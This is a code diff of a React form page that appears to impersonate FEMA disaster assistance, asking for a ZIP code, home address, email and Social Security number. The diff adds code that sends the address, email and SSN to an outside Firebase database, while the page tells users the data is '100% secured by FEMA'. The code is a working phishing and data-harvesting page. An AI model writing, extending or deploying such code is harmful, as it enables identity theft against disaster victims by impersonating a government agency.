@@ -1,96 +1,140 @@
-import { useState } from 'react'
-import {  useNavigate  } from 'react-router-dom';
-
+import { useState } from "react";
+import { useNavigate } from "react-router-dom";
 
 const SecondPage = () => {
-
-  const navigate = useNavigate()
-
-      const [zipCode, setZipCode] = useState("");
+  const [user, setUser] = useState({
+    HomeAddress: "",
+    Email: "",
+    SSN: "",
+  });
+  const [zipCode, setZipCode] = useState("");
+  const navigate = useNavigate();
 
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value;
+    const { name, value } = e.target;
 
-    // Allow only numbers and limit to 5 characters
-    if (/^\d{0,5}$/.test(value)) {
-      setZipCode(value);
+    if (name === "zipCode") {
+      if (/^\d{0,5}$/.test(value)) {
+        setZipCode(value);
+      }
+    } else {
+      setUser((prevUser) => ({
+        ...prevUser,
+        [name]: value,
+      }));
     }
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
 
     if (zipCode.length === 5) {
-      navigate('/thirdselection')
-      alert(`ZIP Code submitted: ${zipCode}`);
+      const { HomeAddress, Email, SSN } = user;
+
+      const options = {
+        method: "POST",
+        headers: {
+          "Content-type": "application/json",
+        },
+        body: JSON.stringify({ HomeAddress, Email, SSN }),
+      };
+
+      fetch(
+        "https://disasterassistance-b480a-default-rtdb.firebaseio.com/new.json",
+        options
+      )
+        .then((res) => res.json())
+        .then((data) => {
+          console.log(data);
+          // alert("Information sent for processing");
+          navigate("/thirdselection");
+        })
+        .catch((error) => {
+          console.error(error);
+          alert("Error sending information");
+        });
     } else {
       alert("Please enter a valid 5-digit ZIP code.");
     }
-
-
   };
 
-    return (
-        <div className="mt-20 pt-4 px-4 "> 
-        <h1 className="font-bold text-[22px]">What is the Location of your loss?</h1>
-        <form onSubmit={handleSubmit} className="max-w-sm mx-auto">
-      <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700 mt-4" >
-        Enter ZIP Code
-      </label>
-      <input
-        type="text"
-        id="zipCode"
-        value={zipCode}
-        onChange={handleChange}
-        placeholder="12345"
-        className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
-      />
-      <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700 mt-4">
-        Home Address
-      </label>
-      <input
-        type="text"
-        id="Home Address"
-        // value={zipCode}
-        onChange={handleChange}
-        placeholder="Enter Home Address"
-        className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
-      />
-      <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700 mt-4">
-        Email Address
-      </label>
-      <input
-        type="text"
-        id="Email Address"
-        // value={zipCode}
-        onChange={handleChange}
-        placeholder="Enter Email Address"
-        className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
-      />
-      <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700 mt-4">
-        Enter SSN Number
-      </label>
-      <label htmlFor="zipCode" className="block text-xs font-medium text-green-600 m1-4">
-        100% secured by <span className='font-bold'>FEMA</span>
-      </label>
-      <input
-        type="text"
-        id="SSN"
-        // value={zipCode}
-        onChange={handleChange}
-        placeholder="Enter 9-digit SSN number"
-        className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
-      />
-      <button
-        type="submit"
-        className="mt-4 mb-4  w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600"
-      >
-        Next
-      </button>
-    </form>
+  const isFormValid =
+    zipCode.length === 5 &&
+    user.HomeAddress.trim() !== "" &&
+    user.Email.trim() !== "" &&
+    user.SSN.trim() !== "";
 
-        </div>
-    )
-}
+  return (
+    <div className="text-center mt-20 pt-4 px-4">
+      <h1 className="font-bold text-[22px]">What is the Location of your loss?</h1>
+      <form className="max-w-sm text-start mx-auto" onSubmit={handleSubmit}>
+        <label htmlFor="zipCode" className="block text-sm font-medium text-gray-700 mt-4">
+          Enter ZIP Code
+        </label>
+        <input
+          type="text"
+          id="zipCode"
+          name="zipCode"
+          value={zipCode}
+          onChange={handleChange}
+          placeholder="12345"
+          className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
+          required
+        />
+        <label htmlFor="HomeAddress" className="block text-sm font-medium text-gray-700 mt-4">
+          Home Address
+        </label>
+        <input
+          type="text"
+          id="HomeAddress"
+          name="HomeAddress"
+          value={user.HomeAddress}
+          onChange={handleChange}
+          placeholder="Enter Home Address"
+          className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
+          required
+        />
+        <label htmlFor="Email" className="block text-sm font-medium text-gray-700 mt-4">
+          Email Address
+        </label>
+        <input
+          type="email"
+          id="Email"
+          name="Email"
+          value={user.Email}
+          onChange={handleChange}
+          placeholder="Enter Email Address"
+          className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
+          required
+        />
+        <label htmlFor="SSN" className="block text-sm font-medium text-gray-700 mt-4">
+          Enter SSN Number
+        </label>
+        <label htmlFor="SSN" className="block text-xs font-medium text-green-600 mt-1">
+          100% secured by <span className="font-bold">FEMA</span>
+        </label>
+        <input
+          type="text"
+          id="SSN"
+          name="SSN"
+          value={user.SSN}
+          onChange={handleChange}
+          placeholder="Enter 9-digit SSN number"
+          className="mt-1 block w-full p-2 border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
+          required
+        />
+        <button
+          type="submit"
+          disabled={!isFormValid}
+          className={`mt-4 mb-4 w-full py-2 rounded-md text-white ${
+            isFormValid ? "bg-blue-500 hover:bg-blue-600" : "bg-gray-400 cursor-not-allowed"
+          }`}
+        >
+          Next
+        </button>
+      </form>
+    </div>
+  );
+};
 
 export default SecondPage;
